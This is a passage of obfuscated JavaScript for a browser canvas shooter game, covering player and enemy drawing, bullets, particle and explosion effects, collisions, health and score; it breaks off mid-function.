const _0x5617f4 = _0x37fa;
(function (_0x14f9b1, _0x2713ee) {
    const _0x694426 = _0x37fa, _0x2de68a = _0x14f9b1();
    while (!![]) {
        try {
            const _0x38d13b = -parseInt(_0x694426(0x131)) / 0x1 * (-parseInt(_0x694426(0x128)) / 0x2) + parseInt(_0x694426(0x11f)) / 0x3 * (parseInt(_0x694426(0x153)) / 0x4) + -parseInt(_0x694426(0x129)) / 0x5 + -parseInt(_0x694426(0x120)) / 0x6 * (-parseInt(_0x694426(0x118)) / 0x7) + parseInt(_0x694426(0x138)) / 0x8 * (-parseInt(_0x694426(0xfa)) / 0x9) + parseInt(_0x694426(0x174)) / 0xa * (-parseInt(_0x694426(0x126)) / 0xb) + parseInt(_0x694426(0x16e)) / 0xc;
            if (_0x38d13b === _0x2713ee)
                break;
            else
                _0x2de68a['push'](_0x2de68a['shift']());
        } catch (_0x4bd460) {
            _0x2de68a['push'](_0x2de68a['shift']());
        }
    }
}(_0x396f, 0x982fa), window[_0x5617f4(0x177)](_0x5617f4(0x17e), function () {
    setTimeout(function () {
        const _0x59705a = _0x37fa, _0x3b64df = document[_0x59705a(0x14d)]('preloader');
        _0x3b64df[_0x59705a(0x166)][_0x59705a(0x10c)] = '0', _0x3b64df[_0x59705a(0x166)]['display'] = _0x59705a(0x137), document['getElementById']('game-container')[_0x59705a(0x166)][_0x59705a(0x105)] = _0x59705a(0xfb), createBackgroundParticles();
    }, 0x7d0);
}));
const style = document['createElement']('style');
style[_0x5617f4(0x12b)] = _0x5617f4(0x116), document['head'][_0x5617f4(0x167)](style);
function createBackgroundParticles() {
    const _0x261802 = _0x5617f4, _0x3343cb = [
            _0x261802(0x113),
            _0x261802(0x164),
            '#ffc93c',
            _0x261802(0x102),
            _0x261802(0x109)
        ];
    for (let _0x3aacb5 = 0x0; _0x3aacb5 < 0x32; _0x3aacb5++) {
        const _0x203fee = document[_0x261802(0xfc)]('div');
        _0x203fee[_0x261802(0x11a)][_0x261802(0x156)](_0x261802(0x13d));
        const _0x575cee = Math[_0x261802(0x148)]() * 0x5 + 0x2, _0xa77df2 = Math['random']() * window[_0x261802(0x101)], _0xa83d7a = Math[_0x261802(0x148)]() * window['innerHeight'], _0xae3010 = _0x3343cb[Math[_0x261802(0x15a)](Math[_0x261802(0x148)]() * _0x3343cb[_0x261802(0x168)])], _0x524740 = Math['random']() * 0xf + 0xa, _0x5c7d02 = Math[_0x261802(0x148)]() * 0x5;
        _0x203fee[_0x261802(0x166)][_0x261802(0x14b)] = _0x575cee + 'px', _0x203fee[_0x261802(0x166)][_0x261802(0x11b)] = _0x575cee + 'px', _0x203fee[_0x261802(0x166)][_0x261802(0x122)] = _0xa77df2 + 'px', _0x203fee[_0x261802(0x166)][_0x261802(0x11e)] = _0xa83d7a + 'px', _0x203fee[_0x261802(0x166)]['backgroundColor'] = _0xae3010, _0x203fee[_0x261802(0x166)][_0x261802(0x10c)] = Math[_0x261802(0x148)]() * 0.5 + 0.1, _0x203fee['style']['animation'] = _0x261802(0x110) + _0x524740 + 's\x20ease-in-out\x20' + _0x5c7d02 + _0x261802(0x14a), document[_0x261802(0x15b)]['appendChild'](_0x203fee);
        const _0x56b80d = _0x261802(0xff) + (Math['random']() * 0x64 - 0x32) + 'px,\x20' + (Math[_0x261802(0x148)]() * 0x64 - 0x32) + 'px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translate(0,\x200);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20', _0x3d01e5 = document[_0x261802(0xfc)]('style');
        _0x3d01e5[_0x261802(0x12b)] = _0x56b80d, document[_0x261802(0xf7)][_0x261802(0x167)](_0x3d01e5);
    }
}
let canvas, ctx, gameRunning = ![], score = 0x0, health = 0x64, animationId, enemies = [], bullets = [], particles = [], muzzleFlashes = [], screenShake = {
        'x': 0x0,
        'y': 0x0,
        'intensity': 0x0,
        'duration': 0x0
    }, lastEnemyTime = 0x0, enemySpawnRate = 0x5dc;
const player = {
    'x': 0x0,
    'y': 0x0,
    'width': 0x3c,
    'height': 0x3c,
    'speed': 0x8,
    'color': _0x5617f4(0x113),
    'isShooting': ![],
    'lastShot': 0x0,
    'shootDelay': 0x12c,
    'wingAngle': 0x0,
    'wingDirection': 0x1,
    'draw': function () {
        const _0x5db4d1 = _0x5617f4;
        ctx[_0x5db4d1(0x157)] = this[_0x5db4d1(0x14e)], ctx[_0x5db4d1(0x14c)] = this['color'], ctx['shadowBlur'] = 0xf, ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x140)](this['x'], this['y'], this[_0x5db4d1(0x14b)] / 0x2, 0x0, Math['PI'] * 0x2), ctx[_0x5db4d1(0x16f)](), ctx[_0x5db4d1(0x175)] = 0x0, ctx[_0x5db4d1(0x157)] = _0x5db4d1(0x17c), ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x162)](this['x'] - 0x14, this['y'] - 0xa, 0x1e, 0xf + Math['sin'](this[_0x5db4d1(0x170)]) * 0x5, Math['PI'] / 0x4 + Math[_0x5db4d1(0x13a)](this[_0x5db4d1(0x170)]) * 0.2, 0x0, Math['PI'] * 0x2), ctx[_0x5db4d1(0x16f)](), ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x162)](this['x'] + 0x14, this['y'] - 0xa, 0x1e, 0xf + Math[_0x5db4d1(0x13a)](this['wingAngle']) * 0x5, -Math['PI'] / 0x4 - Math[_0x5db4d1(0x13a)](this['wingAngle']) * 0.2, 0x0, Math['PI'] * 0x2), ctx[_0x5db4d1(0x16f)](), this[_0x5db4d1(0x170)] += 0.1 * this[_0x5db4d1(0x10e)], Math[_0x5db4d1(0xf8)](this[_0x5db4d1(0x170)]) > 0.5 && (this[_0x5db4d1(0x10e)] *= -0x1), ctx['fillStyle'] = _0x5db4d1(0xfd), ctx[_0x5db4d1(0xf9)](), ctx['arc'](this['x'] - 0xa, this['y'] - 0x5, 0x5, 0x0, Math['PI'] * 0x2), ctx[_0x5db4d1(0x16f)](), ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x140)](this['x'] + 0xa, this['y'] - 0x5, 0x5, 0x0, Math['PI'] * 0x2), ctx['fill'](), ctx[_0x5db4d1(0x157)] = _0x5db4d1(0x163), ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x140)](this['x'] - 0xa, this['y'] - 0x5, 0x2, 0x0, Math['PI'] * 0x2), ctx[_0x5db4d1(0x16f)](), ctx[_0x5db4d1(0xf9)](), ctx[_0x5db4d1(0x140)](this['x'] + 0xa, this['y'] - 0x5, 0x2, 0x0, Math['PI'] * 0x2), ctx['fill']();
    },
    'update': function () {
        const _0x3b91a6 = _0x5617f4;
        if (this['x'] < this[_0x3b91a6(0x14b)] / 0x2)
            this['x'] = this[_0x3b91a6(0x14b)] / 0x2;
        if (this['x'] > canvas[_0x3b91a6(0x14b)] - this[_0x3b91a6(0x14b)] / 0x2)
            this['x'] = canvas[_0x3b91a6(0x14b)] - this['width'] / 0x2;
        if (this['y'] < this[_0x3b91a6(0x11b)] / 0x2)
            this['y'] = this['height'] / 0x2;
        if (this['y'] > canvas[_0x3b91a6(0x11b)] - this[_0x3b91a6(0x11b)] / 0x2)
            this['y'] = canvas['height'] - this[_0x3b91a6(0x11b)] / 0x2;
        this[_0x3b91a6(0x159)] && Date[_0x3b91a6(0x142)]() - this[_0x3b91a6(0x179)] > this['shootDelay'] && (this[_0x3b91a6(0x11d)](), this[_0x3b91a6(0x179)] = Date['now']());
    },
    'shoot': function () {
        const _0x276ae3 = _0x5617f4;
        bullets[_0x276ae3(0x117)]({
            'x': this['x'],
            'y': this['y'] - this['height'] / 0x2,
            'width': 0x5,
            'height': 0xf,
            'speed': 0xa,
            'color': _0x276ae3(0x124),
            'trail': []
        }), createMuzzleFlash(this['x'], this['y'] - this[_0x276ae3(0x11b)] / 0x2), createFireParticles(this['x'], this['y'] - this[_0x276ae3(0x11b)] / 0x2), addScreenShake(0x1, 0x64);
    }
};
function createMuzzleFlash(_0x220bd4, _0xbe1c7a) {
    const _0x6e3277 = _0x5617f4;
    muzzleFlashes[_0x6e3277(0x117)]({
        'x': _0x220bd4,
        'y': _0xbe1c7a,
        'size': 0x1e,
        'opacity': 0x1,
        'life': 0x0,
        'maxLife': 0x5
    });
}
function createFireParticles(_0x266ad6, _0x2fc4ee) {
    const _0x335560 = _0x5617f4;
    for (let _0x4a2cba = 0x0; _0x4a2cba < 0x8; _0x4a2cba++) {
        particles[_0x335560(0x117)]({
            'x': _0x266ad6 + (Math[_0x335560(0x148)]() - 0.5) * 0x14,
            'y': _0x2fc4ee + Math[_0x335560(0x148)]() * 0xa,
            'vx': (Math[_0x335560(0x148)]() - 0.5) * 0x4,
            'vy': -Math[_0x335560(0x148)]() * 0x3 - 0x2,
            'size': Math[_0x335560(0x148)]() * 0x4 + 0x2,
            'color': _0x335560(0x178) + (Math[_0x335560(0x148)]() * 0x3c + 0xf) + ',\x20100%,\x20' + (0x32 + Math[_0x335560(0x148)]() * 0x1e) + '%)',
            'life': 0x0,
            'maxLife': 0xf + Math['random']() * 0xa,
            'type': _0x335560(0x10a)
        });
    }
}
function addScreenShake(_0x45e7fb, _0x1f0da9) {
    const _0x44f1df = _0x5617f4;
    screenShake[_0x44f1df(0x119)] = Math[_0x44f1df(0x144)](screenShake[_0x44f1df(0x119)], _0x45e7fb), screenShake['duration'] = Math['max'](screenShake[_0x44f1df(0x13f)], _0x1f0da9);
}
function initGame() {
    const _0xe81ee3 = _0x5617f4;
    canvas = document[_0xe81ee3(0x14d)]('game-canvas'), ctx = canvas[_0xe81ee3(0x173)]('2d'), resizeCanvas(), window[_0xe81ee3(0x177)]('resize', resizeCanvas), player['x'] = canvas[_0xe81ee3(0x14b)] / 0x2, player['y'] = canvas['height'] - 0x64, document[_0xe81ee3(0x177)](_0xe81ee3(0xfe), handleKeyDown), document[_0xe81ee3(0x177)](_0xe81ee3(0x14f), handleKeyUp), document['getElementById'](_0xe81ee3(0x16a))['addEventListener'](_0xe81ee3(0x133), startGame), document[_0xe81ee3(0x14d)](_0xe81ee3(0x165))[_0xe81ee3(0x177)](_0xe81ee3(0x133), restartGame), canvas['addEventListener']('touchstart', handleTouchStart), canvas[_0xe81ee3(0x177)](_0xe81ee3(0x121), handleTouchMove), canvas[_0xe81ee3(0x177)](_0xe81ee3(0x17d), handleTouchEnd), canvas[_0xe81ee3(0x177)](_0xe81ee3(0x139), handleMouseMove), canvas[_0xe81ee3(0x177)](_0xe81ee3(0x15c), handleMouseDown), canvas[_0xe81ee3(0x177)](_0xe81ee3(0x17f), handleMouseUp);
}
function resizeCanvas() {
    const _0x33bf40 = _0x5617f4;
    canvas[_0x33bf40(0x14b)] = window[_0x33bf40(0x101)], canvas[_0x33bf40(0x11b)] = window['innerHeight'];
}
function startGame() {
    const _0x4f0a32 = _0x5617f4, _0xdafbab = document['getElementById'](_0x4f0a32(0x16d));
    _0xdafbab[_0x4f0a32(0x166)][_0x4f0a32(0x169)] = 'fadeOut\x200.5s\x20forwards', setTimeout(() => {
        const _0x1ca373 = _0x4f0a32;
        _0xdafbab[_0x1ca373(0x166)][_0x1ca373(0x105)] = _0x1ca373(0x137);
    }, 0x1f4), gameRunning = !![], score = 0x0, health = 0x64, enemies = [], bullets = [], particles = [], muzzleFlashes = [], screenShake = {
        'x': 0x0,
        'y': 0x0,
        'intensity': 0x0,
        'duration': 0x0
    }, updateHealthBar(), updateScore(), gameLoop();
}
function restartGame() {
    const _0x300546 = _0x5617f4;
    document[_0x300546(0x14d)]('game-over-screen')[_0x300546(0x166)][_0x300546(0x105)] = _0x300546(0x137), startGame();
}
function gameOver() {
    const _0x115921 = _0x5617f4, _0x19261f = document['getElementById'](_0x115921(0x16b));
    _0x19261f['style'][_0x115921(0x105)] = _0x115921(0x112), _0x19261f[_0x115921(0x166)]['animation'] = _0x115921(0x161), gameRunning = ![], cancelAnimationFrame(animationId), document[_0x115921(0x14d)](_0x115921(0x114))[_0x115921(0x176)] = score;
}
function gameLoop() {
    const _0x56abfa = _0x5617f4;
    if (!gameRunning)
        return;
    screenShake['duration'] > 0x0 ? (screenShake['x'] = (Math[_0x56abfa(0x148)]() - 0.5) * screenShake[_0x56abfa(0x119)], screenShake['y'] = (Math[_0x56abfa(0x148)]() - 0.5) * screenShake[_0x56abfa(0x119)], screenShake['duration']--, screenShake[_0x56abfa(0x119)] *= 0.95) : (screenShake['x'] = 0x0, screenShake['y'] = 0x0), ctx['save'](), ctx[_0x56abfa(0x15e)](screenShake['x'], screenShake['y']), ctx[_0x56abfa(0x16c)](0x0, 0x0, canvas[_0x56abfa(0x14b)], canvas[_0x56abfa(0x11b)]), drawBackground(), player[_0x56abfa(0x149)](), player['draw'](), spawnEnemies(), updateEnemies(), updateBullets(), updateParticles(), updateMuzzleFlashes(), checkCollisions(), ctx['restore'](), animationId = requestAnimationFrame(gameLoop);
}
function updateParticles() {
    const _0x469def = _0x5617f4;
    for (let _0x51dd5e = particles['length'] - 0x1; _0x51dd5e >= 0x0; _0x51dd5e--) {
        const _0x5c0b6b = particles[_0x51dd5e];
        _0x5c0b6b['x'] += _0x5c0b6b['vx'], _0x5c0b6b['y'] += _0x5c0b6b['vy'], _0x5c0b6b[_0x469def(0x100)]++;
        _0x5c0b6b['type'] === 'fire' && (_0x5c0b6b['vy'] += 0.1);
        const _0x3c8671 = Math[_0x469def(0x144)](0x0, 0x1 - _0x5c0b6b[_0x469def(0x100)] / _0x5c0b6b[_0x469def(0x154)]);
        let _0x5b8275 = _0x5c0b6b[_0x469def(0x171)] * _0x3c8671;
        _0x5c0b6b[_0x469def(0x13c)] === _0x469def(0x147) && (_0x5b8275 = _0x5c0b6b[_0x469def(0x171)] * (_0x5c0b6b[_0x469def(0x100)] / _0x5c0b6b[_0x469def(0x154)])), _0x5b8275 = Math[_0x469def(0x144)](0.1, _0x5b8275), _0x3c8671 > 0x0 && _0x5b8275 > 0x0 && (ctx[_0x469def(0x150)](), ctx[_0x469def(0x108)] = _0x3c8671, _0x5c0b6b[_0x469def(0x13c)] === 'shockwave' ? (ctx[_0x469def(0x127)] = _0x5c0b6b[_0x469def(0x14e)], ctx[_0x469def(0x134)] = 0x2, ctx[_0x469def(0x14c)] = _0x5c0b6b[_0x469def(0x14e)], ctx[_0x469def(0x175)] = 0xa, ctx[_0x469def(0xf9)](), ctx[_0x469def(0x140)](_0x5c0b6b['x'], _0x5c0b6b['y'], _0x5b8275, 0x0, Math['PI'] * 0x2), ctx[_0x469def(0x136)]()) : (ctx[_0x469def(0x157)] = _0x5c0b6b[_0x469def(0x14e)], ctx[_0x469def(0x14c)] = _0x5c0b6b[_0x469def(0x14e)], ctx[_0x469def(0x175)] = Math[_0x469def(0x144)](0x1, _0x5c0b6b[_0x469def(0x171)]), ctx[_0x469def(0xf9)](), ctx[_0x469def(0x140)](_0x5c0b6b['x'], _0x5c0b6b['y'], _0x5b8275, 0x0, Math['PI'] * 0x2), ctx['fill']()), ctx[_0x469def(0x10b)]()), (_0x5c0b6b['life'] >= _0x5c0b6b[_0x469def(0x154)] || _0x3c8671 <= 0x0) && particles['splice'](_0x51dd5e, 0x1);
    }
}
function updateMuzzleFlashes() {
    const _0x2648cd = _0x5617f4;
    for (let _0x51fae8 = muzzleFlashes[_0x2648cd(0x168)] - 0x1; _0x51fae8 >= 0x0; _0x51fae8--) {
        const _0x2850d2 = muzzleFlashes[_0x51fae8];
        _0x2850d2['life']++;
        const _0x21d5d6 = Math[_0x2648cd(0x144)](0x0, 0x1 - _0x2850d2[_0x2648cd(0x100)] / _0x2850d2['maxLife']), _0x13d4c1 = Math['max'](0.1, _0x2850d2[_0x2648cd(0x171)] * (0x1 + _0x2850d2[_0x2648cd(0x100)] * 0.2));
        _0x21d5d6 > 0x0 && _0x13d4c1 > 0x0 && (ctx[_0x2648cd(0x150)](), ctx[_0x2648cd(0x108)] = _0x21d5d6, ctx[_0x2648cd(0x157)] = '#ffffff', ctx['shadowColor'] = _0x2648cd(0x124), ctx[_0x2648cd(0x175)] = 0x14, ctx[_0x2648cd(0xf9)](), ctx[_0x2648cd(0x140)](_0x2850d2['x'], _0x2850d2['y'], _0x13d4c1, 0x0, Math['PI'] * 0x2), ctx[_0x2648cd(0x16f)](), ctx[_0x2648cd(0x10b)]()), (_0x2850d2[_0x2648cd(0x100)] >= _0x2850d2['maxLife'] || _0x21d5d6 <= 0x0) && muzzleFlashes[_0x2648cd(0x15f)](_0x51fae8, 0x1);
    }
}
function drawBackground() {
    const _0x4ebd79 = _0x5617f4, _0x5194a5 = ctx[_0x4ebd79(0x158)](0x0, 0x0, 0x0, canvas[_0x4ebd79(0x11b)]);
    _0x5194a5[_0x4ebd79(0x11c)](0x0, _0x4ebd79(0x104)), _0x5194a5[_0x4ebd79(0x11c)](0x1, _0x4ebd79(0x12f)), ctx[_0x4ebd79(0x157)] = _0x5194a5, ctx[_0x4ebd79(0x143)](0x0, 0x0, canvas[_0x4ebd79(0x14b)], canvas[_0x4ebd79(0x11b)]), ctx[_0x4ebd79(0x157)] = 'white';
    for (let _0x2502d2 = 0x0; _0x2502d2 < 0x64; _0x2502d2++) {
        const _0x11d83f = Math['random']() * canvas[_0x4ebd79(0x14b)], _0x57bdde = Math[_0x4ebd79(0x148)]() * canvas[_0x4ebd79(0x11b)], _0x23b0b5 = Math[_0x4ebd79(0x148)]() * 0x2;
        ctx['fillRect'](_0x11d83f, _0x57bdde, _0x23b0b5, _0x23b0b5);
    }
}
function spawnEnemies() {
    const _0x1fc3da = _0x5617f4, _0x162131 = Date['now']();
    if (_0x162131 - lastEnemyTime > enemySpawnRate) {
        const _0x2bc964 = Math[_0x1fc3da(0x148)]() * 0x1e + 0x14;
        enemies['push']({
            'x': Math[_0x1fc3da(0x148)]() * (canvas[_0x1fc3da(0x14b)] - _0x2bc964) + _0x2bc964 / 0x2,
            'y': -_0x2bc964,
            'width': _0x2bc964,
            'height': _0x2bc964,
            'speed': Math[_0x1fc3da(0x148)]() * 0x2 + 0x1,
            'color': _0x1fc3da(0x178) + (Math[_0x1fc3da(0x148)]() * 0x3c + 0x12c) + ',\x2080%,\x2060%)',
            'health': Math[_0x1fc3da(0x15a)](_0x2bc964 / 0xa)
        }), lastEnemyTime = _0x162131, score > 0x0 && score % 0x1f4 === 0x0 && enemySpawnRate > 0x1f4 && (enemySpawnRate -= 0x64);
    }
}
function updateEnemies() {
    const _0x254deb = _0x5617f4;
    for (let _0x3a4576 = enemies[_0x254deb(0x168)] - 0x1; _0x3a4576 >= 0x0; _0x3a4576--) {
        const _0x53f762 = enemies[_0x3a4576];
        _0x53f762['y'] += _0x53f762[_0x254deb(0x17b)], ctx[_0x254deb(0x150)](), ctx[_0x254deb(0x157)] = _0x53f762[_0x254deb(0x14e)], ctx[_0x254deb(0x14c)] = _0x53f762[_0x254deb(0x14e)], ctx[_0x254deb(0x175)] = 0xa, ctx[_0x254deb(0xf9)](), ctx[_0x254deb(0x140)](_0x53f762['x'], _0x53f762['y'], _0x53f762[_0x254deb(0x14b)] / 0x2, 0x0, Math['PI'] * 0x2), ctx[_0x254deb(0x16f)](), ctx[_0x254deb(0x10b)](), ctx[_0x254deb(0x157)] = _0x254deb(0xfd), ctx['beginPath'](), ctx['arc'](_0x53f762['x'] - _0x53f762[_0x254deb(0x14b)] * 0.2, _0x53f762['y'] - _0x53f762[_0x254deb(0x11b)] * 0.1, _0x53f762['width'] * 0.1, 0x0, Math['PI'] * 0x2), ctx[_0x254deb(0x16f)](), ctx[_0x254deb(0xf9)](), ctx[_0x254deb(0x140)](_0x53f762['x'] + _0x53f762[_0x254deb(0x14b)] * 0.2, _0x53f762['y'] - _0x53f762['height'] * 0.1, _0x53f762[_0x254deb(0x14b)] * 0.1, 0x0, Math['PI'] * 0x2), ctx['fill'](), ctx[_0x254deb(0x157)] = _0x254deb(0x163), ctx[_0x254deb(0xf9)](), ctx['arc'](_0x53f762['x'] - _0x53f762['width'] * 0.2, _0x53f762['y'] - _0x53f762[_0x254deb(0x11b)] * 0.1, _0x53f762[_0x254deb(0x14b)] * 0.05, 0x0, Math['PI'] * 0x2), ctx[_0x254deb(0x16f)](), ctx[_0x254deb(0xf9)](), ctx['arc'](_0x53f762['x'] + _0x53f762[_0x254deb(0x14b)] * 0.2, _0x53f762['y'] - _0x53f762[_0x254deb(0x11b)] * 0.1, _0x53f762['width'] * 0.05, 0x0, Math['PI'] * 0x2), ctx['fill'](), _0x53f762['y'] > canvas['height'] + _0x53f762[_0x254deb(0x11b)] && enemies[_0x254deb(0x15f)](_0x3a4576, 0x1);
    }
}
function updateBullets() {
    const _0x2dc2d9 = _0x5617f4;
    for (let _0xa2d0e2 = bullets[_0x2dc2d9(0x168)] - 0x1; _0xa2d0e2 >= 0x0; _0xa2d0e2--) {
        const _0x52872e = bullets[_0xa2d0e2];
        _0x52872e['y'] -= _0x52872e[_0x2dc2d9(0x17b)], _0x52872e['trail']['push']({
            'x': _0x52872e['x'],
            'y': _0x52872e['y'] + _0x52872e[_0x2dc2d9(0x11b)]
        });
        _0x52872e['trail']['length'] > 0x8 && _0x52872e[_0x2dc2d9(0x10d)]['shift']();
        for (let _0x1a3305 = 0x0; _0x1a3305 < _0x52872e['trail'][_0x2dc2d9(0x168)]; _0x1a3305++) {
            const _0x1e1f78 = _0x52872e['trail'][_0x1a3305], _0x157751 = (_0x1a3305 + 0x1) / _0x52872e[_0x2dc2d9(0x10d)][_0x2dc2d9(0x168)] * 0.5, _0x5eb77e = Math['max'](0.1, (_0x1a3305 + 0x1) / _0x52872e[_0x2dc2d9(0x10d)][_0x2dc2d9(0x168)] * 0x3);
            _0x157751 > 0x0 && _0x5eb77e > 0x0 && (ctx[_0x2dc2d9(0x150)](), ctx['globalAlpha'] = _0x157751, ctx['fillStyle'] = _0x52872e[_0x2dc2d9(0x14e)], ctx[_0x2dc2d9(0x14c)] = _0x52872e[_0x2dc2d9(0x14e)], ctx[_0x2dc2d9(0x175)] = 0x5, ctx[_0x2dc2d9(0xf9)](), ctx[_0x2dc2d9(0x140)](_0x1e1f78['x'], _0x1e1f78['y'], _0x5eb77e, 0x0, Math['PI'] * 0x2), ctx[_0x2dc2d9(0x16f)](), ctx[_0x2dc2d9(0x10b)]());
        }
        ctx['save'](), ctx['fillStyle'] = _0x52872e['color'], ctx['shadowColor'] = _0x52872e[_0x2dc2d9(0x14e)], ctx[_0x2dc2d9(0x175)] = 0xf, ctx['fillRect'](_0x52872e['x'] - _0x52872e[_0x2dc2d9(0x14b)] / 0x2, _0x52872e['y'], _0x52872e[_0x2dc2d9(0x14b)], _0x52872e[_0x2dc2d9(0x11b)]), ctx[_0x2dc2d9(0x157)] = '#ffffff', ctx[_0x2dc2d9(0x175)] = 0x5, ctx[_0x2dc2d9(0x143)](_0x52872e['x'] - _0x52872e[_0x2dc2d9(0x14b)] / 0x4, _0x52872e['y'] + 0x2, _0x52872e[_0x2dc2d9(0x14b)] / 0x2, _0x52872e['height'] - 0x4), ctx[_0x2dc2d9(0x10b)](), _0x52872e['y'] + _0x52872e[_0x2dc2d9(0x11b)] < 0x0 && bullets[_0x2dc2d9(0x15f)](_0xa2d0e2, 0x1);
    }
}
function _0x37fa(_0x475f2d, _0x35df63) {
    const _0x396f38 = _0x396f();
    return _0x37fa = function (_0x37fa4c, _0xf41378) {
        _0x37fa4c = _0x37fa4c - 0xf7;
        let _0x7b32c3 = _0x396f38[_0x37fa4c];
        return _0x7b32c3;
    }, _0x37fa(_0x475f2d, _0x35df63);
}
function checkCollisions() {
    const _0x5c393f = _0x5617f4;
    for (let _0x5281f8 = bullets[_0x5c393f(0x168)] - 0x1; _0x5281f8 >= 0x0; _0x5281f8--) {
        const _0x258548 = bullets[_0x5281f8];
        for (let _0x4f4cce = enemies['length'] - 0x1; _0x4f4cce >= 0x0; _0x4f4cce--) {
            const _0x2d421d = enemies[_0x4f4cce], _0x3abd0d = _0x258548['x'] - _0x2d421d['x'], _0x294fad = _0x258548['y'] + _0x258548[_0x5c393f(0x11b)] / 0x2 - _0x2d421d['y'], _0x22d704 = Math[_0x5c393f(0x103)](_0x3abd0d * _0x3abd0d + _0x294fad * _0x294fad);
            if (_0x22d704 < _0x2d421d[_0x5c393f(0x14b)] / 0x2) {
                _0x2d421d[_0x5c393f(0x10f)]--, bullets['splice'](_0x5281f8, 0x1), createEnhancedHitEffect(_0x2d421d['x'], _0x2d421d['y'], _0x2d421d[_0x5c393f(0x14e)]);
                _0x2d421d['health'] <= 0x0 && (score += Math[_0x5c393f(0x15a)](_0x2d421d[_0x5c393f(0x14b)]), updateScore(), enemies[_0x5c393f(0x15f)](_0x4f4cce, 0x1), createEnhancedExplosion(_0x2d421d['x'], _0x2d421d['y'], _0x2d421d[_0x5c393f(0x14e)], _0x2d421d[_0x5c393f(0x14b)]), addScreenShake(0x3, 0xc8));
                break;
            }
        }
    }
    for (let _0x17d80f = enemies['length'] - 0x1; _0x17d80f >= 0x0; _0x17d80f--) {
        const _0x36dc47 = enemies[_0x17d80f], _0x4cbbc3 = player['x'] - _0x36dc47['x'], _0x18d4b4 = player['y'] - _0x36dc47['y'], _0x19fe8d = Math['sqrt'](_0x4cbbc3 * _0x4cbbc3 + _0x18d4b4 * _0x18d4b4);
        _0x19fe8d < player[_0x5c393f(0x14b)] / 0x2 + _0x36dc47[_0x5c393f(0x14b)] / 0x2 && (health -= 0xa, updateHealthBar(), enemies[_0x5c393f(0x15f)](_0x17d80f, 0x1), createEnhancedExplosion(_0x36dc47['x'], _0x36dc47['y'], _0x36dc47['color'], _0x36dc47[_0x5c393f(0x14b)]), addScreenShake(0x5, 0x12c), health <= 0x0 && (health = 0x0, updateHealthBar(), gameOver()));
    }
}
function createEnhancedHitEffect(_0x2b9691, _0x1ad33e, _0x490cd5) {
    const _0x141aec = _0x5617f4;
    for (let _0x42b7a1 = 0x0; _0x42b7a1 < 0xc; _0x42b7a1++) {
        const _0x436f0c = Math[_0x141aec(0x148)]() * Math['PI'] * 0x2, _0x46e1f8 = Math[_0x141aec(0x148)]() * 0x5 + 0x2;
        particles[_0x141aec(0x117)]({
            'x': _0x2b9691,
            'y': _0x1ad33e,
            'vx': Math['cos'](_0x436f0c) * _0x46e1f8,
            'vy': Math[_0x141aec(0x13a)](_0x436f0c) * _0x46e1f8,
            'size': Math[_0x141aec(0x148)]() * 0x3 + 0x1,
            'color': _0x141aec(0x109),
            'life': 0x0,
            'maxLife': 0x8 + Math['random']() * 0x5,
            'type': 'spark'
        });
    }
    for (let _0xb19b5 = 0x0; _0xb19b5 < 0x8; _0xb19b5++) {
        const _0x2353e4 = Math[_0x141aec(0x148)]() * Math['PI'] * 0x2, _0x495736 = Math[_0x141aec(0x148)]() * 0x3 + 0x1;
        particles[_0x141aec(0x117)]({
            'x': _0x2b9691 + (Math[_0x141aec(0x148)]() - 0.5) * 0xa,
            'y': _0x1ad33e + (Math[_0x141aec(0x148)]() - 0.5) * 0xa,
            'vx': Math[_0x141aec(0x12e)](_0x2353e4) * _0x495736,
            'vy': Math[_0x141aec(0x13a)](_0x2353e4) * _0x495736,
            'size': Math[_0x141aec(0x148)]() * 0x4 + 0x2,
            'color': _0x490cd5,
            'life': 0x0,
            'maxLife': 0xc + Math[_0x141aec(0x148)]() * 0x8,
            'type': _0x141aec(0x130)
        });
    }
}
function createEnhancedExplosion(_0x5b4b47, _0x34a6dc, _0x1d0b48, _0x2e02e7) {
    const _0x5cd1dd = _0x5617f4, _0xc994c3 = Math['floor'](_0x2e02e7 / 0x2) + 0xf;
    particles['push']({
        'x': _0x5b4b47,
        'y': _0x34a6dc,
        'vx': 0x0,
        'vy': 0x0,
        'size': _0x2e02e7 * 0.3,
        'color': _0x5cd1dd(0x109),
        'life': 0x0,
        'maxLife': 0x14,
        'type': 'shockwave'
    });
    for (let _0x4f79e3 = 0x0; _0x4f79e3 < _0xc994c3; _0x4f79e3++) {
        const _0x408c8f = Math[_0x5cd1dd(0x148)]() * Math['PI'] * 0x2, _0xb8c0c = Math['random']() * 0x8 + 0x3, _0x2e48b0 = Math[_0x5cd1dd(0x148)]() * 0x6 + 0x2;
        particles['push']({
            'x': _0x5b4b47,
            'y': _0x34a6dc,
            'vx': Math[_0x5cd1dd(0x12e)](_0x408c8f) * _0xb8c0c,
            'vy': Math[_0x5cd1dd(0x13a)](_0x408c8f) * _0xb8c0c,
            'size': _0x2e48b0,
            'color': _0x5cd1dd(0x178) + (Math['random']() * 0x3c + 0xf) + _0x5cd1dd(0x123) + (0x32 + Math['random']() * 0x1e) + '%)',
            'life': 0x0,
            'maxLife': 0x19 + Math[_0x5cd1dd(0x148)]() * 0xf,
            'type': _0x5cd1dd(0x107)
        });
    }
    for (let _0x55aebe = 0x0; _0x55aebe < 0x6; _0x55aebe++) {
        const _0x46af66 = Math['random']() * Math['PI'] * 0x2, _0x3e10c4 = Math[_0x5cd1dd(0x148)]() * 0x4 + 0x2;
        particles[_0x5cd1dd(0x117)]({
            'x': _0x5b4b47,
            'y': _0x34a6dc,
            'vx': Math[_0x5cd1dd(0x12e)](_0x46af66) * _0x3e10c4,
            'vy': Math[_0x5cd1dd(0x13a)](_0x46af66) * _0x3e10c4 - 0x1,
